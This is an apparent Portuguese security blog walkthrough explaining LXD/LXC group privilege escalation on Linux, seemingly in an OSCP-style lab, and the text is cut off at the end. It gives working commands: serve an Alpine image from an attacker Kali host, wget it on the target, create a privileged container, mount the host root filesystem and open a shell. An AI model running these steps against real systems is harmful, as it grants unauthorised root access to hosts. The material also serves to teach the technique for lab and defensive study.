<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>Privilege Escalation by LXD/LXC&nbsp;|&nbsp;www.offensivethink.com</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="Privilege Escalation by LXD/LXC">
  
    <meta name="description" content="Como abusar de containers para escalar privilégios">
    <meta property="og:description" content="Como abusar de containers para escalar privilégios">
  
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="index.html">
    <div class="Navbar__Btn">
      
      <span>Home</span>
    </div>
  </a>
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
      <span class="Navbar__Delim">&centerdot;</span>
      <a href="referencia-rapida.html">
        <div class="Navbar__Btn">
          
          <span>→ Referência rápida ← </span>
        </div>
      </a>
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
      <span class="Navbar__Delim">&centerdot;</span>
      <a href="contacts.html">
        <div class="Navbar__Btn">
          
            <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F12e48681-f6a0-41cb-aa1f-73a46f35c5d3%2FOffensiveThink_Logo_Negative_notion_-_280x280.png?table=block&amp;id=ca933149-5245-4511-a885-9cf5922808e1"></span>&nbsp;
          
          <span>about &amp; contacts</span>
        </div>
      </a>
    
  
    
      <span class="Navbar__Delim">&centerdot;</span>
      <a href="offensivetools.html">
        <div class="Navbar__Btn">
          
          <span>Offensive Tools</span>
        </div>
      </a>
    
  
    
  
    
  
</nav>
  <header class="Header">
    
      <div class="Header__Cover">
        <img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F63ccfb83-81ce-4c3b-bfb2-3ecb51c7bb26%2Froot_the_box.png?table=block&amp;id=88160841-f1d3-4d69-987d-909149074612">
      </div>
    
    <div class="Header__Spacer ">
    </div>
    
    <h1 class="Header__Title_post">Privilege Escalation by LXD/LXC</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Thu, Aug 6, 2020</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
            <a href="tag/privEsc.html">privEsc</a>
          </span>
        
      </div>
    
  </header>
  <article id="https://www.notion.so/88160841f1d34d69987d909149074612" class="PageRoot"><h2 id="https://www.notion.so/fabc6587ff3049cabf676564b0ae58c0" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/fabc6587ff3049cabf676564b0ae58c0"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple">Too Long To Read - TL; TR;</mark></span><span class="SemanticString"> </span></span></h2><div id="https://www.notion.so/07d924e063764217aff3b490d3f496e4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Se o usuário for do </span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed">grupo lxd</mark></span><span class="SemanticString"> é possível instanciar um container com um linux e montar a raiz do host nele, tendo assim permissão total a todos os arquivos.</span></span></p></div><pre id="https://www.notion.so/dee9ae97c25148daa09c4c5ef485fd1e" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><span>NO KALI ATACANTE - Montar a Imagem</span></strong></mark></span></span><span class="SemanticString"><span> 
<span class="token punctuation">(</span>Caso a máquina atacada não tenha acesso a Internet<span class="token punctuation">)</span>

$ https://github.com/diegoalbuquerque/lxd-alpine-builder
$ <span class="token builtin class-name">cd</span> lxd-alpine-builder
$ ./build-alpine
$ python3 -c http.server <span class="token number">80</span>

</span></span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold"><span>NA VM ATACADA</span></strong></mark></span></span><span class="SemanticString"><span>

$ <span class="token builtin class-name">cd</span> /tmp
$ <span class="token function">wget</span> http://192.168.1.5/alpine-v3.12-x86_64-20200806_1741.tar.gz
$ /snap/bin/lxc image <span class="token function">import</span> /tmp/alpine-v3.12-x86_64-20200806_1741.tar.gz --alias myimage

<span class="token comment"># Caso o LXD não possua Storage Pool</span>
$ lxd init
<span class="token comment"># ou Criar um Pool do tipo dir </span>
$ /snap/bin/lxc storage create pool <span class="token function">dir</span>

<span class="token comment">#  myimage = nome da imagem que importamos</span>
<span class="token comment">#  mycontainer = nome do container que estamos inicializando </span>
$ lxc init myimage mycontainer -c security.privileged<span class="token operator">=</span>true

<span class="token comment">#  adicionando um device disk ao container</span>
<span class="token comment">#  source = / (O conteudo do disco será a raiz da vm!)</span>
<span class="token comment">#  path   = /mnt/host (Onde o disco será montado)</span>
$ lxc config device <span class="token function">add</span> mycontainer mydevice disk <span class="token assign-left variable">source</span><span class="token operator">=</span>/ <span class="token assign-left variable">path</span><span class="token operator">=</span>/mnt/host <span class="token assign-left variable">recursive</span><span class="token operator">=</span>true

<span class="token comment"># Inicializando o container</span>
$ lxc start mycontainer

<span class="token comment"># Executando no container o comando /bin/sh</span>
$ lxc <span class="token builtin class-name">exec</span> mycontainer /bin/sh

</span></span></span></code></pre><div id="https://www.notion.so/c2d284addeef4cb696489ca7b2e1642a" class="Bookmark"><a href="https://github.com/diegoalbuquerque/lxd-alpine-builder/blob/master/build-alpine"><h5 class="Bookmark__Title">diegoalbuquerque/lxd-alpine-builder</h5><p class="Bookmark__Desc">Build Alpine Linux images for LXD. Contribute to diegoalbuquerque/lxd-alpine-builder development by creating an account on GitHub.</p><p class="Bookmark__Link">https://github.com/diegoalbuquerque/lxd-alpine-builder/blob/master/build-alpine</p></a></div><div id="https://www.notion.so/90d0549ce0dc4470ac2e44ac96aada0b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h2 id="https://www.notion.so/07f158bd7360425a891817ab3c488da7" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/07f158bd7360425a891817ab3c488da7"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple">Começando do Começo</mark></span></span></h2><div id="https://www.notion.so/08e661b0d96e49fd8aa018a9e3b81e88" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Existe uma forma de escalar privilégio quando o usuário no qual você está logado pertence ao grupo lxd</span></span></p></div><div id="https://www.notion.so/eb49ad877f584692a5e6cb325d9a39ba" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F341bd25e-a32e-4402-a72b-ef3883e06a30%2FUntitled.png?width=987&amp;table=block&amp;id=eb49ad87-7f58-4692-a5e6-cb325d9a39ba"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F341bd25e-a32e-4402-a72b-ef3883e06a30%2FUntitled.png?width=987&amp;table=block&amp;id=eb49ad87-7f58-4692-a5e6-cb325d9a39ba" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/20228b9b3d864daab242f8eaace6e465" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Isso permite o usuário escalar o privilégio através do deamon LXD , rodando no linux, sem a necessidade inclusive de saber a senha do usuário, o que é útil em nosso caso onde logamos na máquina com a chave privada do usuário e não sabemos a sua senha. </span></span></p></div><h2 id="https://www.notion.so/91d546ff388043688843388868aab398" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/91d546ff388043688843388868aab398"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">O que é LXD/LXC ? </span></span></h2><div id="https://www.notion.so/c27815dc70d04e23b1109ad600c6303d" class="Bookmark"><a href="https://github.com/lxc/lxd"><h5 class="Bookmark__Title">lxc/lxd</h5><p class="Bookmark__Desc">LXD is a next generation system container and virtual machine manager. It offers a unified user experience around full Linux systems running inside containers or virtual machines. It&#x27;s image based with pre-made images available for a wide number of Linux distributions and is built around a very powerful, yet pretty simple, REST API.</p><p class="Bookmark__Link">https://github.com/lxc/lxd</p></a></div><div id="https://www.notion.so/2fb38b8f35ee4ab8b927d80341fb01c6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2b0eba4399854df49d923ed819f499cb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">O LXD é um deamon gerenciador de containers, como o docker, baseado em imagens. Para controle dos containers e das imagens é utilizado o binário LXC.</span></span></p></div><div id="https://www.notion.so/1e704873f1a649ce995c357616a6ff79" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/502aa6aa2bfd4fc7b2b0ce524b7efe4d" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fce64147b-e164-4f93-8d41-6d183f9c30a6%2FUntitled.png?width=906&amp;table=block&amp;id=502aa6aa-2bfd-4fc7-b2b0-ce524b7efe4d"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fce64147b-e164-4f93-8d41-6d183f9c30a6%2FUntitled.png?width=906&amp;table=block&amp;id=502aa6aa-2bfd-4fc7-b2b0-ce524b7efe4d" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/834232ad1e56472ea700211700143982" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><h3 id="https://www.notion.so/19e85126604042dcb64ffb57df8ddf7b" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/19e85126604042dcb64ffb57df8ddf7b"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Como funciona o ataque ?!</span></span></h3><div id="https://www.notion.so/630b52f0d8564c1197029be7ce6d723e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Como o usuário,oscp,  pertence ao grupo lxd isso indica que ele pode instanciar containers onde ele mesmo é root. Para a exploração então vamos instanciar um container contendo um Alpine Linux e montando nele todo a raiz do host local. Uma vez montado dentro do Alpine linux poderemos acessar todos os arquivos do host local através do ponto de montagem. </span></span></p></div><h3 id="https://www.notion.so/3188c25a07cc4d78aa9717c344f111f1" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/3188c25a07cc4d78aa9717c344f111f1"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Atacando</span></span></h3><div id="https://www.notion.so/cbca4d096e0d4ca6a78e3a72606860ae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Observe que lxd está inicializado </span></span></p></div><div id="https://www.notion.so/e150e4e48cea4457a4b725b358815eb9" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbb9b912a-8573-476a-8ff9-15c01d71daa9%2FUntitled.png?width=1342&amp;table=block&amp;id=e150e4e4-8cea-4457-a4b7-25b358815eb9"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbb9b912a-8573-476a-8ff9-15c01d71daa9%2FUntitled.png?width=1342&amp;table=block&amp;id=e150e4e4-8cea-4457-a4b7-25b358815eb9" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/096e81475b89473794b3df18aa34c326" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Observe que, como o lxd não está no path do usuário, foi necessário procurá-lo, ficanto então o s binários lxd e lxc dentro do diretário /snap/bin/</span></span></p></div><div id="https://www.notion.so/e3f153c5a8634e0e9b6437fd73453f2b" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F272f447b-f037-465d-ace0-bdb042ecac9c%2FUntitled.png?width=680&amp;table=block&amp;id=e3f153c5-a863-4e0e-9b64-37fd73453f2b"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F272f447b-f037-465d-ace0-bdb042ecac9c%2FUntitled.png?width=680&amp;table=block&amp;id=e3f153c5-a863-4e0e-9b64-37fd73453f2b" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/0d5a5fd43e134897a81ae08ed3689e7b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/400e0cec9c2749bdb8bb1831e5ca05c5" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F2b9848f6-8298-4b4e-9246-440c9aded1f9%2FUntitled.png?width=920&amp;table=block&amp;id=400e0cec-9c27-49bd-b8bb-1831e5ca05c5"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F2b9848f6-8298-4b4e-9246-440c9aded1f9%2FUntitled.png?width=920&amp;table=block&amp;id=400e0cec-9c27-49bd-b8bb-1831e5ca05c5" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/55c81876d9424744bdfa1bc42d4465ac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3f9387e15a8047a899c2bb5247613507" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">O Linux Container trabalha com imagens que servirão de base para instanciar o container em si, logo precisaremos de uma imagem. </span></span></p></div><div id="https://www.notion.so/323b2886136747ad9a7386ea34403048" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">É possível baixar uma imagem diretamente dos repositórios públicos pré-configurados com o lxd, mas esta máquina não possui conexão com a Internet, logo </span><span class="SemanticString"><span class="SemanticString__Fragment SemanticString__Fragment--Unknown"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">precisaremos disponibilizar a imagem manualmente para a máquina</strong></span></span><span class="SemanticString">. </span></span></p></div><div id="https://www.notion.so/365b2b3484254a7aacd411ad0041cd3c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/fbcd231f8d624d1b94c94322c1d457d6" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F89bd0067-ae4a-49c5-b845-f01cb223c7a9%2FUntitled.png?width=432&amp;table=block&amp;id=fbcd231f-8d62-4d1b-94c9-4322c1d457d6"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F89bd0067-ae4a-49c5-b845-f01cb223c7a9%2FUntitled.png?width=432&amp;table=block&amp;id=fbcd231f-8d62-4d1b-94c9-4322c1d457d6" style="width:432px"/></a><figcaption><span class="SemanticStringArray"><span class="SemanticString">Comandos para buscar imagens</span></span></figcaption></figure></div><div id="https://www.notion.so/bfc81d1724574de48e6ac01478f05d03" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/12c976315327432ca939c90f0476f8b5" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9fd6eb55-87b8-4c3a-a7a1-aec4892173bc%2FUntitled.png?width=672&amp;table=block&amp;id=12c97631-5327-432c-a939-c90f0476f8b5"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9fd6eb55-87b8-4c3a-a7a1-aec4892173bc%2FUntitled.png?width=672&amp;table=block&amp;id=12c97631-5327-432c-a939-c90f0476f8b5" style="width:672px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/97eeaae2fcc940cda0a987c77e2fde3b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/922c76643b45440fbe7f241e76c797cd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Para montar uma imagem, sem a necessidade de ter uma máquina com o lxd instalado, utilizaremos o script </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">build-alpine</code></span><span class="SemanticString"> clonado do repositório:</span></span></p></div><div id="https://www.notion.so/2e7fa2d9aa354fa2be51400f432e67da" class="Bookmark"><a href="https://github.com/diegoalbuquerque/lxd-alpine-builder"><h5 class="Bookmark__Title">diegoalbuquerque/lxd-alpine-builder</h5><p class="Bookmark__Desc">This script provides a way to create Alpine Linux images for their use with LXD. It&#x27;s based off the LXC templates. The image will be built just by installing the alpine-base meta-package. Networking and syslog are enabled by default.</p><p class="Bookmark__Link">https://github.com/diegoalbuquerque/lxd-alpine-builder</p></a></div><div id="https://www.notion.so/d7d1fffc3e20431cba1df3508427e53b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Este é um fork do saghul/lxd-alpine-builder</em></span></span></p></div><div id="https://www.notion.so/870e765faca94bbfa037f520e3662d04" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Em seu kali local (</span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">iremos depois subir a imagem para a vm)</em></span><span class="SemanticString">, executar : </span></span></p></div><pre id="https://www.notion.so/bdc3ebd89a6e469a879242ad6afdc188" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>$ https://github.com/diegoalbuquerque/lxd-alpine-builder
$ <span class="token builtin class-name">cd</span> lxd-alpine-builder
$ ./build-alpine</span></span></span></code></pre><div id="https://www.notion.so/dcfb1a2ea193485f94237e259e6d0bcc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorRed"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Atenção! </strong></mark></span><span class="SemanticString">Aparentemente alguns &quot;mirrors&quot; estão com problema levando o script a falhar, não terminando conforme esperado:</span></span></p></div><div id="https://www.notion.so/269599549579462eb3d69687c6dbabb6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2afc8d2f3afb4d46828e52106ad6fe27" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa934f51f-bd1a-40e8-bf0e-9ffa7f05dc44%2FUntitled.png?width=802&amp;table=block&amp;id=2afc8d2f-3afb-4d46-828e-52106ad6fe27"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa934f51f-bd1a-40e8-bf0e-9ffa7f05dc44%2FUntitled.png?width=802&amp;table=block&amp;id=2afc8d2f-3afb-4d46-828e-52106ad6fe27" style="width:100%"/></a><figcaption><span class="SemanticStringArray"><span class="SemanticString">Erro ao acessar o mirror.csclub.unwaterloo.ca</span></span></figcaption></figure></div><div id="https://www.notion.so/ccf1a728079447169c5c5db2259dd15c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Executando o script algumas vezes ele termina o processo quando o repositório está ok.</span></span></p></div><div id="https://www.notion.so/2f83e0b440a54bc7b40cbbcebcadcb32" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"> </span></span></p></div><div id="https://www.notion.so/f996bf2811494670bc023ab6ec6981af" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F8b314df7-fcfe-41d8-87f2-46b5d1e727ac%2FUntitled.png?width=810&amp;table=block&amp;id=f996bf28-1149-4670-bc02-3ab6ec6981af"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F8b314df7-fcfe-41d8-87f2-46b5d1e727ac%2FUntitled.png?width=810&amp;table=block&amp;id=f996bf28-1149-4670-bc02-3ab6ec6981af" style="width:100%"/></a><figcaption><span class="SemanticStringArray"><span class="SemanticString">Script executado com sucesso ao acessar o mirror mirror.clarkson.edu</span></span></figcaption></figure></div><div id="https://www.notion.so/ee2b013256334beaabf36bd1a46c62d7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Ao final teremos a imagem salva no formato .tar.gz —&gt; </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">alpine-v3.12-x86_64-20200806_1741.tar.gz</code></span></span></p></div><div id="https://www.notion.so/a297f47c9e284300913706273a3ed0f9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Agora de posse da imagem vamos subir um sevidor web para disponibilizá-la para nossa VM a ser atacada. </span></span></p></div><div id="https://www.notion.so/05a3ec9073e648308087c97045ac86b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/270df48de2dd4d8db399b38e36f5047c" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F15802e36-6136-4b5a-a517-9a583d174ee3%2FUntitled.png?width=766&amp;table=block&amp;id=270df48d-e2dd-4d8d-b399-b38e36f5047c"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F15802e36-6136-4b5a-a517-9a583d174ee3%2FUntitled.png?width=766&amp;table=block&amp;id=270df48d-e2dd-4d8d-b399-b38e36f5047c" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1e0cbeabb4994525974a60385212f60f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/cb01dd99be224bdd88161c4c979fd9ac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Agora na VM , vamos importar a imagem com o comando lxc. </span></span></p></div><div id="https://www.notion.so/cdcc32eb81944e66a029ad415d8dbfc6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Caso você possua um servidor web https em seu kali (queira levantar o apache, etc.), é possível importar diretamente com o comando </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">lxc image import</code></span><span class="SemanticString"> , mas o comando não aceita http, logo temos que copiar o arquivo para a VM para poder importar diretamente do filesystem</span></span></p></div><div id="https://www.notion.so/dd9b7593e88d473498050c012028feec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/b1f76dc35b2c489bbf24b281936b48a5" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F085e41cc-d1e2-4062-ac40-c4a7302656de%2FUntitled.png?width=1028&amp;table=block&amp;id=b1f76dc3-5b2c-489b-bf24-b281936b48a5"><img 